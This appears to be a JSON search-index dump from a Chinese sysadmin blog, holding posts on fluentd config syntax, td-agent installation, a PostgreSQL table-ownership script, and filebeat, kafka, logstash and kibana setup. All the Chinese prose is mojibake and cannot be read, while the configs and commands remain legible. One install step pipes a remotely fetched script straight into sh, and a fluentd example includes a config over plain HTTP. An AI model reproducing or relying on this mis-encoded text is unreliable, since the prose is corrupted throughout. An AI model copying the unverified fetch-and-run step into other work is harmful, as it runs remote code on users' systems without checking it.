â€œlabelâ€æŒ‡ä»¤ç”¨æ¥é™ä½tagè·¯ç”±çš„å¤æ‚åº¦ï¼Œé€šè¿‡â€labelâ€æŒ‡ä»¤å¯ä»¥ç”¨æ¥ç»„ç»‡filterå’Œmatchçš„å†…éƒ¨è·¯ç”±ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªé…ç½®çš„ä¾‹å­ï¼Œç”±äºâ€labelâ€æ˜¯å†…å»ºçš„æ’ä»¶ï¼Œæ‰€ä»¥ä»–çš„å‚æ•°éœ€è¦ä»¥@å¼€å¤´ã€‚ \u003csource\u003e @type forward \u003c/source\u003e \u003csource\u003e @type tail @label @SYSTEM \u003c/source\u003e \u003cfilter access.**\u003e @type record_transformer \u003crecord\u003e # ... \u003c/record\u003e \u003c/filter\u003e \u003cmatch **\u003e @type elasticsearch # ... \u003c/match\u003e \u003clabel @SYSTEM\u003e \u003cfilter var.log.middleware.**\u003e @type grep # ... \u003c/filter\u003e \u003cmatch **\u003e @type s3 # ... \u003c/match\u003e \u003c/label\u003e åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œforwardçš„æ•°æ®æºçš„äº‹ä»¶è¢«è·¯ç”±åˆ°record_transformer filterå’Œelasticsearch outputä¸­ã€‚tailæ•°æ®æºè¢«è·¯ç”±åˆ°@systemé‡Œé¢çš„grep filterå’Œs3 outputä¸­ã€‚ â€œlabelâ€å¯¹äºä¸å¸¦æ ‡è®°å‰ç¼€çš„äº‹ä»¶æµåˆ†ç¦»éå¸¸æœ‰ç”¨ã€‚ @ERROR label @ERROR labelæ˜¯å†…å»ºçš„labelï¼Œç”¨æ¥è®°å½•emit_error_eventé”™è¯¯äº‹ä»¶çš„ã€‚å¦‚æœåœ¨é…ç½®æ–‡ä»¶é‡Œé¢è®¾ç½®äº†ï¼Œå½“æœ‰ç›¸å…³çš„é”™è¯¯å‘ç”Ÿï¼ˆæ¯”å¦‚ï¼šç¼“å†²åŒºå·²æ»¡æˆ–æ— æ•ˆè®°å½•ï¼‰çš„è¯ï¼Œè¯¥é”™è¯¯äº‹ä»¶å°±ä¼šè¢«å‘é€åˆ°\u003c label @ERROR \u003eã€‚ ","date":"2020-05-27 15:13","objectID":"/post/1711/:1:6","tags":["elk","efk","fluentd"],"title":"fluentdé…ç½®æ–‡ä»¶è¯­æ³•(äºŒ)","uri":"/post/1711/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"6.â€œ@includeâ€ï¼šé‡ç”¨é…ç½® å¯ä»¥ä½¿ç”¨@includeæŒ‡ä»¤å¯¼å…¥å•ç‹¬é…ç½®æ–‡ä»¶ä¸­çš„æŒ‡ä»¤ï¼š # Include config files in the ./config.d directory @include config.d/*.conf @includeæŒ‡ä»¤æ”¯æŒå¸¸è§„æ–‡ä»¶è·¯å¾„ã€globæ¨¡å¼ï¼Œå’Œhttp URLçº¦å®šï¼š # absolute path @include /path/to/config.conf # ä½¿ç”¨ç›¸å¯¹è·¯å¾„ @include extra.conf # glob match pattern @include config.d/*.conf # http @include http://example.com/fluent.conf å¯ä»¥é€šè¿‡â€@includeâ€æ¥å¯¼å…¥å…¶ä»–çš„é…ç½®æ–‡ä»¶ï¼Œé…ç½®æ–‡ä»¶æ˜¯æŒ‰é¡ºåºå¯¼å…¥çš„ã€‚å¦‚æœä½¿ç”¨æ¨¡å¼åŒ¹é…çš„è¯ï¼Œæ–‡ä»¶æ˜¯æŒ‰å­—æ¯é¡ºåºå¯¼å…¥çš„ã€‚ # If you have a.conf,b.conf,...,z.conf and a.conf / z.conf are important... # This is bad @include *.conf # This is good @include a.conf @include config.d/*.conf @include z.conf å¦‚æœå¯¼å…¥çš„æ–‡ä»¶æœ‰é¡ºåºçš„è¦æ±‚çš„è¯ï¼Œæœ€å¥½è‡ªå·±ä¸»åŠ¨å†™å¯¼å…¥çš„è¯­å¥ï¼Œæ¨¡å¼åŒ¹é…å¯¼å…¥å®¹æ˜“å‡ºé”™ã€‚ ä¹Ÿå¯ä»¥åœ¨ä¸åŒçš„åŒºå—ä¸­å¯¼å…¥ç›¸åŒçš„é…ç½®@include /path/to/out_buf_params.conf # config file \u003cmatch pattern\u003e @type forward # other parameters... \u003cbuffer\u003e @type file path /path/to/buffer/forward @include /path/to/out_buf_params.conf \u003c/buffer\u003e \u003c/match\u003e \u003cmatch pattern\u003e @type elasticsearch # other parameters... \u003cbuffer\u003e @type file path /path/to/buffer/es @include /path/to/out_buf_params.conf \u003c/buffer\u003e \u003c/match\u003e # /path/to/out_buf_params.conf flush_interval 5s total_limit_size 100m chunk_limit_size 1m æ”¯æŒçš„æ•°æ®ç±»å‹ æ¯ä¸ªæ’ä»¶éƒ½éœ€è¦ä¸€äº›å‚æ•°ã€‚ä¾‹å¦‚ï¼šin_tailæ’ä»¶æœ‰rotate_waitå’Œpos_fileè¿™ä¸¤ä¸ªå‚æ•°ã€‚æ¯ä¸ªå‚æ•°éƒ½æœ‰å¯¹åº”çš„ç±»å‹ä¸å…¶å…³è”ã€‚ä¸‹é¢æ˜¯è¿™äº›ç±»å‹çš„å®šä¹‰ï¼š string ç±»å‹ï¼šè¯¥ç±»å‹è¢«è§£ææˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚stringç±»å‹å¯ä»¥æœ‰ä¸‰ç§å½¢å¼ï¼šä¸å¸¦å¼•å·çš„å­—ç¬¦ä¸²ã€å¸¦å•å¼•å·çš„å­—ç¬¦ä¸²å’Œå¸¦åŒå¼•å·çš„å­—ç¬¦ä¸²ã€‚ integer ç±»å‹ï¼šè¯¥ç±»å‹è¢«è§£ææˆä¸€ä¸ªæ•´æ•°ã€‚ float ç±»å‹ï¼šè¯¥ç±»å‹è¢«è§£ææˆä¸€ä¸ªæµ®ç‚¹æ•°ã€‚ size ç±»å‹ï¼šè¯¥ç±»å‹ç”¨æ¥è§£ææˆæœ‰å¤šå°‘ä¸ªå­—èŠ‚ã€‚å¯ä»¥åœ¨æ•´æ•°åé¢åŠ ä¸Šk/Kã€m/Mã€g/Gã€t/Tï¼Œå¯¹åº”çš„æ˜¯è®¡ç®—æœºå­¦ç§‘çš„åº¦é‡å•ä½ã€‚æ¯”å¦‚ï¼š12kè¡¨ç¤ºä¸º12*1024åçš„æ•°å€¼ã€‚ time ç±»å‹ï¼šè¯¥ç±»å‹è¢«è§£ææˆæ—¶é—´ã€‚å¯ä»¥åœ¨æµ®ç‚¹æ•°åé¢åŠ ä¸Šsã€mã€hå’Œdåˆ†åˆ«è¡¨ç¤ºä¸ºç§’ã€åˆ†ã€å°æ—¶ã€å¤©ã€‚å¯ä»¥ç”¨0.1è¡¨ç¤º100msã€‚ array ç±»å‹ï¼šè¯¥ç±»å‹è¢«è§£ææˆJSONæ•°ç»„ã€‚è¿™ç§ç±»å‹è¿˜æ”¯æŒç¼©å†™ï¼Œæ¯”å¦‚ï¼š[â€œkey1â€, â€œkey2â€]å¯ä»¥ç¼©å†™æˆkey1,key2ã€‚ hash ç±»å‹ï¼šè¯¥ç±»å‹è¢«è§£ææˆJSONå¯¹è±¡ã€‚è¿™ç§ç±»å‹ä¹Ÿæ”¯æŒç¼©å†™ï¼Œæ¯”å¦‚ï¼š{â€œkey1â€:â€value1â€, â€œkey2â€:â€value2â€}å¯ä»¥ç¼©å†™æˆkey1:value1,key2:value2ã€‚ ","date":"2020-05-27 15:13","objectID":"/post/1711/:1:7","tags":["elk","efk","fluentd"],"title":"fluentdé…ç½®æ–‡ä»¶è¯­æ³•(äºŒ)","uri":"/post/1711/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"1.å®‰è£… curl -L https://toolbelt.treasuredata.com/sh/install-redhat-td-agent3.sh | sh 2.å¯åŠ¨ systemctl start td-agent.service 3.é»˜è®¤çš„é…ç½®æ–‡ä»¶ä¸­é…ç½®äº†httpæ¥æ”¶æ–¹å¼ï¼Œç›‘å¬å¾—æ˜¯8888ç«¯å£ï¼Œè¿™é‡Œæµ‹è¯•ä¸€æ¡æ—¥å¿— debug.testï¼šè¿™ä¸ªæ˜¯tagï¼Œé…ç½®æ–‡ä»¶ä¸­çš„matchæ¥åŒ¹é…è¿™ä¸ªtagï¼Œæ²¡æœ‰åŒ¹é…åˆ°å°±ä¸ä¼šè¾“å‡ºæ—¥å¿— {â€œjsonâ€:â€œmessageâ€}ï¼šè¿™ä¸ªæ˜¯æ¨¡æ‹Ÿçš„æ—¥å¿—å†…å®¹ curl -X POST -d 'json={\"json\":\"message\"}' http://localhost:8888/debug.test tail /var/log/td-agent/td-agent.log ","date":"2020-05-27 14:57","objectID":"/post/1709/:0:0","tags":["fluentd"],"title":"fluentdå®‰è£…å…¥é—¨(ä¸€)","uri":"/post/1709/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"\\c åº“å; DO $$ DECLARE r record; i int; v_schema text[] := '{public}'; v_new_owner varchar := 'æ–°çš„ç”¨æˆ·å'; BEGIN FOR r IN SELECT 'ALTER TABLE \"' || table_schema || '\".\"' || table_name || '\" OWNER TO ' || v_new_owner || ';' AS a FROM information_schema.tables WHERE table_schema = ANY (v_schema) UNION ALL SELECT 'ALTER TABLE \"' || sequence_schema || '\".\"' || sequence_name || '\" OWNER TO ' || v_new_owner || ';' AS a FROM information_schema.sequences WHERE sequence_schema = ANY (v_schema) UNION ALL SELECT 'ALTER TABLE \"' || table_schema || '\".\"' || table_name || '\" OWNER TO ' || v_new_owner || ';' AS a FROM information_schema.views WHERE table_schema = ANY (v_schema) UNION ALL SELECT 'ALTER FUNCTION \"' || nsp.nspname || '\".\"' || p.proname || '\"(' || pg_get_function_identity_arguments(p.oid) || ') OWNER TO ' || v_new_owner || ';' AS a FROM pg_proc p JOIN pg_namespace nsp ON p.pronamespace = nsp.oid WHERE nsp.nspname = ANY (v_schema) UNION ALL SELECT 'ALTER DATABASE \"' || current_database() || '\" OWNER TO ' || v_new_owner LOOP EXECUTE r.a; END LOOP; FOR i IN array_lower(v_schema, 1)..array_upper(v_schema, 1) LOOP EXECUTE 'ALTER SCHEMA \"' || v_schema[i] || '\" OWNER TO ' || v_new_owner; END LOOP; END $$; ","date":"2020-05-27 10:27","objectID":"/post/1707/:0:0","tags":["pgsql"],"title":"psqlä¿®æ”¹æ‰€æœ‰è¡¨çš„æ‰€æœ‰è€…","uri":"/post/1707/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"å®ç°é€»è¾‘ filebeatÂ ==\u003e\u003eÂ kafkaÂ \u003c\u003c==Â logstashÂ ==\u003e\u003eÂ elastsearchÂ \u003c==Â kibana filebeaté…ç½® filebeat.inputs: - type: log enabled: true paths: - /var/log/messages fields: log_topic: test_kafka filebeat.config.modules: path: ${path.config}/modules.d/*.yml reload.enabled: false setup.template.settings: index.number_of_shards: 3 output.kafka: enable: true hosts: [\"log1:9092\"] version: \"2.0.0\" topic: '%{[fields.log_topic]}' partition.round_robin: reachable_only: true worker: 1 required_acks: 1 compression: gzip compression_level: 4 max_message_bytes: 10000000 processors: - drop_fields: fields: - beat - host - input - source - offset - prospector å¯åŠ¨æœåŠ¡ logstashé…ç½®ï¼š input { kafka{ bootstrap_servers =\u003e \"log1:9092\" topics =\u003e [\"test_kafka\"] codec =\u003e \"json\" } } output { elasticsearch { hosts =\u003e \"log1:9200\" index =\u003e \"test_kafka-%{+YYYY.MM.dd}\" } } å¯åŠ¨æœåŠ¡ nohup ./logstash -f es.conf \u0026 3.ä½¿ç”¨kibanaéªŒè¯ å¯ä»¥æ‰‹åŠ¨æ¨¡æ‹Ÿç”Ÿæˆæ—¥å¿—ï¼š echo \"æ‰‹åŠ¨echoæµ‹è¯•\" \u003e\u003e /var/log/messages ","date":"2020-05-25 16:01","objectID":"/post/1701/:0:0","tags":["elk"],"title":"filebeat+kafka+logstashæ”¶é›†æ—¥å¿—åˆ°esä½¿ç”¨kibanaå±•ç¤º","uri":"/post/1701/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸‹è½½å®‰è£…ï¼š wget https://artifacts.elastic.co/downloads/kibana/kibana-6.8.9-linux-x86_64.tar.gz tar xfÂ kibana-6.8.9-linux-x86_64.tar.gz mv kibana-6.8.9-linux-x86_64 /usr/local/kibana cd /usr/local/kibana/ ä¿®æ”¹é…ç½®ï¼š vim config/kibana.yml server.port: 5601 server.host: \"0.0.0.0\" elasticsearch.hosts: [\"http://localhost:9200\"] kibana.index: \".kibana\" å¯åŠ¨æœåŠ¡ï¼š nohup bin/kibana \u0026 ","date":"2020-05-25 15:52","objectID":"/post/1703/:0:0","tags":["elk"],"title":"kibanaå®‰è£…é…ç½®","uri":"/post/1703/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"logstashé…ç½®ï¼š input { beats { port =\u003e 5044 host =\u003e \"0.0.0.0\" } } output{ kafka{ bootstrap_servers =\u003e \"log1:9092\" topic_id =\u003e \"test_kafka\" } } å¯åŠ¨logstash nohup ./logstash -f test.conf \u0026 filebeaté…ç½®ï¼š filebeat.inputs: - type: log enabled: true paths: - /var/log/messages name: \"log1\" output.logstash: hosts: [\"10.0.0.6:5044\"] logging.level: debug å¯åŠ¨filebeat nohup ./filebeat -e -c filebeat.yml \u0026 æ–°å»ºä¸€ä¸ªç»ˆç«¯ç”Ÿæˆæ—¥å¿—ï¼Œç„¶åè§‚å¯Ÿkafka ","date":"2020-05-25 14:44","objectID":"/post/1699/:0:0","tags":["elk"],"title":"logstashä½¿ç”¨filebeatä½œä¸ºæ—¥å¿—æº","uri":"/post/1699/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"1.å‘½ä»¤è¡Œè¿è¡Œä¸€ä¸ªç®€å•çš„è¾“å…¥è¾“å‡º ./logstash -e 'input{stdin{}} output{stdout{codec=\u003erubydebug}}' å°†ä¸Šé¢çš„é…ç½®å†™åˆ°é…ç½®æ–‡ä»¶ä¸­ï¼Œä»¥é…ç½®æ–‡ä»¶çš„æ–¹å¼åŠ è½½ vim test.conf input { stdin{} } output{ stdout{codec =\u003e rubydebug} } ./logstash -f test.conf 2.ä½¿ç”¨æ–‡ä»¶çš„æ–¹å¼æ”¶é›†æ—¥å¿— input { file{ path =\u003e \"/var/log/messages\" } } output{ stdout{codec =\u003e rubydebug} } ./logstash -f test.conf æ–°å»ºä¸€ä¸ªç»ˆç«¯é“¾æ¥æŸ¥çœ‹æ˜¯å¦æœ‰æ—¥å¿—è¾“å‡º 2.1 å°†æ—¥å¿—è¾“å‡ºåˆ°kafkaä¸­ ./logstash -f test.conf input { file{ path =\u003e \"/var/log/messages\" } } output{ kafka{ bootstrap_servers =\u003e \"log1:9092\" topic_id =\u003e \"test_kafka\" } } è¿æ¥kafkaæ¶ˆè´¹ç«¯ï¼Œæ–°å»ºç»ˆç«¯çœ‹çœ‹æ•ˆæœ åå°æ–¹å¼è¿è¡Œlogstash nohup ./logstash -f test.conf \u0026\u003e logstash.log \u0026 ","date":"2020-05-25 13:40","objectID":"/post/1695/:0:0","tags":["elk"],"title":"logstashé…ç½®(ä¸€)","uri":"/post/1695/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"å®‰è£…ï¼š wget https://artifacts.elastic.co/downloads/logstash/logstash-6.8.9.tar.gz tar xf logstash-6.8.9.tar.gz mv logstash-6.8.9 /usr/local/logstash å¸¸ç”¨çš„inputæ’ä»¶ï¼š å®˜æ–¹é“¾æ¥ï¼šhttps://www.elastic.co/guide/en/logstash/6.8/input-plugins.html fileï¼šè¯»å–ä¸€ä¸ªæ–‡ä»¶ï¼Œç±»ä¼¼tailå‘½ä»¤ä¸€è¡Œä¸€è¡Œå®æ—¶è¯»å–ã€‚ syslogï¼šç›‘å¬ç³»ç»Ÿ514ç«¯å£çš„syslog messagesã€‚ redisï¼šä»redisè¯»å–æ•°æ®ã€‚ kafkaï¼šä»kafkaä¸­æ¶ˆè´¹æ•°æ®ï¼Œä¸€èˆ¬ç”¨äºæ•°æ®é‡è¾ƒå¤§çš„ä¸šåŠ¡åœºæ™¯ã€‚ filebeatï¼šä»filebeatä¸­æ¥æ”¶æ•°æ® å¸¸ç”¨çš„filteræ’ä»¶ï¼š grokï¼šgrok æ˜¯ logstash æœ€é‡è¦çš„æ’ä»¶,å¯ä»¥è§£æå¹¶ç»“æ„åŒ–ä»»æ„æ•°æ®ã€‚æ”¯æŒæ­£åˆ™ï¼Œå¹¶æä¾›äº†å¾ˆå¤šå†…ç½®çš„è§„åˆ™å’Œæ¨¡æ¿ã€‚ mutateï¼šåŸºç¡€ç±»å‹æ•°æ®å¤„ç†ï¼ŒåŒ…æ‹¬ç±»å‹è½¬æ¢ã€å­—ç¬¦ä¸²å¤„ç†ã€å­—æ®µå¤„ç† dateï¼šè½¬æ¢æ—¥å¿—ä¸­çš„æ—¶é—´æ ¼å¼ GeoIPï¼šè¯†åˆ«IPåœ°å€çš„åœ°åŸŸä¿¡æ¯ã€ç»çº¬åº¦ç­‰ã€‚ å¸¸ç”¨çš„outputæ’ä»¶ï¼š elasticsearchï¼šè¾“å‡ºåˆ°esä¸­ fileï¼šè¾“å‡ºåˆ°é—®ä»·ä¸­ redisï¼šè¾“å‡ºåˆ°redisä¸­ kafkaï¼šè¾“å‡ºåˆ°kafkaä¸­ ","date":"2020-05-25 11:35","objectID":"/post/1689/:0:0","tags":["elk"],"title":"logstash6.8.9å®‰è£…å’Œå¸¸ç”¨æ’ä»¶è¯´æ˜","uri":"/post/1689/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"æŸ¥çœ‹è¿‡æ»¤ä¹‹å‰çš„å­—æ®µï¼š ä¿®æ”¹filebeaté…ç½®æ–‡ä»¶ï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼Œåˆ é™¤æ‰ä¸è¦çš„å­—æ®µ processors: - drop_fields: fields: - beat - host - input - source - offset - prospector ","date":"2020-05-21 17:28","objectID":"/post/1686/:0:0","tags":["elk","efk"],"title":"filebeatå­—æ®µè¿‡æ»¤å’ŒåŠ å·¥","uri":"/post/1686/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"1.å®‰è£…éƒ¨ç½²ï¼š wget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-6.8.9-linux-x86_64.tar.gz tar xf filebeat-6.8.9-linux-x86_64.tar.gz mv filebeat-6.8.9-linux-x86_64 /usr/local/filebeat 2.æŸ¥çœ‹é…ç½®æ–‡ä»¶ï¼š vim /usr/local/filebeat/filebeat.yml # å®šä¹‰æ•°æ®æ¥æº filebeat.inputs: # æ—¥å¿—æ¥æºç±»å‹logã€stdinã€redisã€ç­‰ç­‰ - type: log # å¯ç”¨ enabled: true #æŒ‡å®šæ—¥å¿—è·¯å¾„ï¼Œæ”¯æŒæ¨¡ç³ŠåŒ¹é…ï¼Œå¦‚ï¼š/var/log/nginx/nginx*.log paths: - /var/log/messages - /var/log/secure #è¡Œè¿‡æ»¤ï¼Œä»¥DBGå¼€å¤´çš„è¡Œä¸æ”¶é›† #exclude_lines: ['^DBG'] #æ–‡ä»¶è¿‡æ»¤ï¼Œä»¥gzç»“å°¾çš„æ–‡ä»¶ä¸æ”¶é›† #exclude_files: ['.gz$'] #å¢åŠ å­—æ®µ fields: # å®šä¹‰tpoicçš„åç§°ï¼Œæ–¹ä¾¿å‘é€åˆ°kafkaä¸åŒçš„topicä¸­ log_topic: osmessages #åç§°ï¼Œä»é‚£ä¸ªèŠ‚ç‚¹æ”¶é›†çš„æ—¥å¿— name: \"elk1\" #æ—¥å¿—è¾“å‡ºåˆ°kafkaä¸­ output.kafka: #å¯ç”¨ enabled: true #kafkaé›†ç¾¤åœ°å€ hosts: [\"elk1:9092\", \"elk2:9092\", \"elk3:9092\"] #kafkaçš„ç‰ˆæœ¬ version: \"2.0.0\" topic: '%{[fields.log_topic]}' #ä½¿ç”¨è½®è¯¢çš„æ–¹å¼å†™å…¥åˆ°ä¸åŒçš„partitionã€‚å¿…é¡»æ˜¯ random, round_robin, hash ä¸‰ç§çš„ä¸€ç§ï¼Œé»˜è®¤ä¸º false partition.round_robin: reachable_only: true #å‘é€æ¶ˆæ¯ç»™kafkaçš„è¿›ç¨‹æ•° worker: 2 #ACKå¯é æ€§çº§åˆ«ã€‚0=æ— å“åº”ï¼Œ1=ç­‰å¾…æœ¬åœ°æäº¤ï¼Œ-1=ç­‰å¾…æ‰€æœ‰å‰¯æœ¬æäº¤ã€‚é»˜è®¤å€¼ä¸º1ã€‚ required_acks: 1 #å‹ç¼©æ–¹å¼ compression: gzip #å‹ç¼©çº§åˆ«(1-9)ï¼Œ0ä¸ºç¦ç”¨ compression_level: 4 #JSONç¼–ç æ¶ˆæ¯çš„æœ€å¤§å…è®¸å¤§å°ã€‚è¾ƒå¤§çš„å°†è¢«ä¸¢å¼ƒã€‚é»˜è®¤å€¼ä¸º1000000ï¼ˆå­—èŠ‚ï¼‰ï¼Œ10Mã€‚ max_message_bytes: 10000000 #è®¾ç½®æ—¥å¿—çº§åˆ«ï¼Œå¯é€‰error, warning, info, debug logging.level: debug 3.å¯åŠ¨filebeat cd /usr/local/filebeat/ nohup ./filebeat -e -c filebeat.yml \u0026 4.æŸ¥çœ‹kafkaï¼š sh kafka-console-consumer.sh --bootstrap-server elk1:9092,elk2:9092,elk3:9092 --topic osmessage ","date":"2020-05-21 16:04","objectID":"/post/1679/:0:0","tags":["elk","filebeat"],"title":"filebeat6.8.9å®‰è£…å¹¶é…ç½®è¾“å‡ºæ—¥å¿—åˆ°kafka","uri":"/post/1679/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"å·¥å…·å‡åœ¨kafkaå®‰è£…ç›®å½•ä¸­çš„binç›®å½•ä¸‹ï¼š ä¸ºäº†ä½¿ç”¨æ–¹ä¾¿æˆ‘ä¸´æ—¶åšä¸€ä¸ªåˆ«åï¼š alias kfk='sh /usr/local/kafka/bin/kafka-topics.sh --zookeeper elk1:2181,elk2:2181,elk3:2181' ","date":"2020-05-21 11:35","objectID":"/post/1673/:0:0","tags":["kafka","elk"],"title":"kafkaå¸¸ç”¨åŸºæœ¬æ“ä½œ","uri":"/post/1673/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸€ã€æ˜¾ç¤ºtopicåˆ—è¡¨ kfk â€“list ","date":"2020-05-21 11:35","objectID":"/post/1673/:0:1","tags":["kafka","elk"],"title":"kafkaå¸¸ç”¨åŸºæœ¬æ“ä½œ","uri":"/post/1673/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"äºŒã€åˆ›å»ºä¸€ä¸ªtopicï¼Œå¹¶æŒ‡å®štopicå±æ€§ï¼ˆå‰¯æœ¬æ•°ã€åˆ†åŒºæ•°ç­‰ï¼‰ â€“replication-factor ï¼šä¸ºtopicåˆ›å»ºå¤šå°‘ä¸ªå‰¯æœ¬ kfk â€“create â€“replication-factor 3 â€“partitions 3 â€“topic mytopic ","date":"2020-05-21 11:35","objectID":"/post/1673/:0:2","tags":["kafka","elk"],"title":"kafkaå¸¸ç”¨åŸºæœ¬æ“ä½œ","uri":"/post/1673/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸‰ã€æŸ¥çœ‹æŸä¸ªtopicçš„çŠ¶æ€ kfk â€“describe â€“topic mytopic ç¬¬ä¸€è¡Œæ˜¯topicçš„åŸºæœ¬ä¿¡æ¯ ä¸‹é¢ä¸‰è¡Œä»£è¡¨æ¯ä¸ªtopicçš„åˆ†åŒºåˆ†å¸ƒæƒ…å†µ leader è´Ÿè´£è¯»å†™partitonçš„èŠ‚ç‚¹ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰å¯èƒ½æˆä¸ºleaderã€‚ replicas å½“å‰partitionçš„å‰¯æœ¬å­˜å‚¨åœ¨å“ªäº›èŠ‚ç‚¹ï¼Œä¸ç®¡è¯¥èŠ‚ç‚¹æ˜¯å¦æ˜¯leaderæˆ–è€…æ˜¯å¦å­˜æ´»éƒ½ä¼šæ˜¾ç¤ºã€‚ isr å‰¯æœ¬èŠ‚ç‚¹ä¸­å­˜æ´»çš„èŠ‚ç‚¹åˆ—è¡¨ï¼Œå¹¶ä¸”éƒ½å’ŒleaderåŒæ­¥ mytopicè¿™ä¸ªTopicä¸¾ä¾‹è§£é‡Š: ç¼–å·ä¸º0çš„Partition,Leaderåœ¨broker.id=2è¿™ä¸ªèŠ‚ç‚¹ä¸Š.å‰¯æœ¬åˆ†å¸ƒåœ¨broker.idä¸º2,3,1è¿™ä¸‰ä¸ªèŠ‚ç‚¹. å‰¯æœ¬2,3,1å¤„äºå­˜æ´»çŠ¶æ€ï¼Œå¹¶è·Ÿleader(broker.id=2è¿™ä¸ªèŠ‚ç‚¹)åŒæ­¥ ç¼–å·ä¸º1çš„Partition,Leaderåœ¨broker.id=3è¿™ä¸ªèŠ‚ç‚¹ä¸Š.å‰¯æœ¬åˆ†å¸ƒåœ¨broker.idä¸º3,1,2è¿™ä¸‰ä¸ªèŠ‚ç‚¹. å‰¯æœ¬3,1,2å¤„äºå­˜æ´»çŠ¶æ€ï¼Œå¹¶è·Ÿleader(broker.id=3è¿™ä¸ªèŠ‚ç‚¹)åŒæ­¥ ","date":"2020-05-21 11:35","objectID":"/post/1673/:0:3","tags":["kafka","elk"],"title":"kafkaå¸¸ç”¨åŸºæœ¬æ“ä½œ","uri":"/post/1673/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"å››ã€ç”Ÿäº§æ¶ˆæ¯ã€æ¶ˆè´¹æ¶ˆæ¯ è¿›å…¥ç”Ÿäº§è€…æ§åˆ¶å°ï¼š ./kafka-console-producer.sh â€“broker-list elk1:9092,elk2:9092,elk3:9092 â€“topic mytopic è¿›å…¥æ¶ˆè´¹è€…æ§åˆ¶å°ï¼š ./kafka-console-consumer.sh â€“bootstrap-server elk1:9092,elk2:9092,elk3:9092 â€“topic mytopic æ­¤æ—¶åœ¨ç”Ÿäº§è€…æ§åˆ¶å°è¾“å…¥å†…å®¹ï¼Œä¼šç›´æ¥è¢«æ¶ˆè´¹è€…å–å‡ºï¼š æ·»åŠ â€“from-beginningå‚æ•°å¯ä»¥ä¸€æ¬¡æ€§å–å‡ºæ‰€æœ‰æ¶ˆæ¯ ","date":"2020-05-21 11:35","objectID":"/post/1673/:0:4","tags":["kafka","elk"],"title":"kafkaå¸¸ç”¨åŸºæœ¬æ“ä½œ","uri":"/post/1673/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"äº”ã€åˆ é™¤topic /usr/local/kafka/bin/kafka-topics.sh --zookeeper elk1:2181,elk2:2181,elk3:2181 --delete --topic mytopic ","date":"2020-05-21 11:35","objectID":"/post/1673/:0:5","tags":["kafka","elk"],"title":"kafkaå¸¸ç”¨åŸºæœ¬æ“ä½œ","uri":"/post/1673/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"å…­ã€åˆ é™¤æ¶ˆè´¹è€…ç»„ ./kafka-consumer-groups.sh --bootstrap-server elk1:9092,elk2:9092,elk3:9092 --delete --group xxxxx ","date":"2020-05-21 11:35","objectID":"/post/1673/:0:6","tags":["kafka","elk"],"title":"kafkaå¸¸ç”¨åŸºæœ¬æ“ä½œ","uri":"/post/1673/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"1.ä¸‹è½½å®‰è£…ï¼š wget https://archive.apache.org/dist/kafka/2.0.1/kafka_2.12-2.0.1.tgz tar xfÂ kafka_2.12-2.0.1.tgz mv kafka_2.12-2.0.1 /usr/local/kafka 2.é…ç½®zookeeperï¼šå¯å‚è€ƒhttps://soulchild.cn/1663.html /usr/local/kafka/config/zookeeper.properties åˆ›å»º /tmp/zookeeper/myidæ–‡ä»¶ echo 1 \u003e /tmp/zookeeper/myid å¯åŠ¨zookeeper cd /usr/local/kafka/bin ./zookeeper-server-start.sh -daemon ../config/zookeeper.properties 5.é…ç½®kafkaï¼š æ–‡ä»¶è·¯å¾„ï¼š/usr/local/kafka/config/server.properties ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼š #kafkaé›†ç¾¤çš„å”¯ä¸€æ ‡è¯†ï¼Œåœ¨æ”¹å˜IPåœ°å€ï¼Œä¸æ”¹å˜broker.idçš„è¯ä¸ä¼šå½±å“æ¶ˆè´¹è€…ã€‚ #Kafkaåœ¨å¯åŠ¨æ—¶ä¼šåœ¨zookeeperä¸­/brokers/idsè·¯å¾„ä¸‹åˆ›å»ºä¸€ä¸ªä»¥brokerçš„idä¸ºåç§°çš„è™šèŠ‚ç‚¹ï¼ŒKafkaçš„å¥åº·çŠ¶æ€æ£€æŸ¥å°±ä¾èµ–äºæ­¤èŠ‚ç‚¹ã€‚ #å½“brokerä¸‹çº¿æ—¶ï¼Œè¯¥è™šèŠ‚ç‚¹ä¼šè‡ªåŠ¨åˆ é™¤ï¼Œå…¶ä»–brokeræˆ–è€…å®¢æˆ·ç«¯é€šè¿‡åˆ¤æ–­/brokers/idsè·¯å¾„ä¸‹æ˜¯å¦æœ‰æ­¤brokerçš„idæ¥ç¡®å®šè¯¥brokerçš„å¥åº·çŠ¶æ€ã€‚ 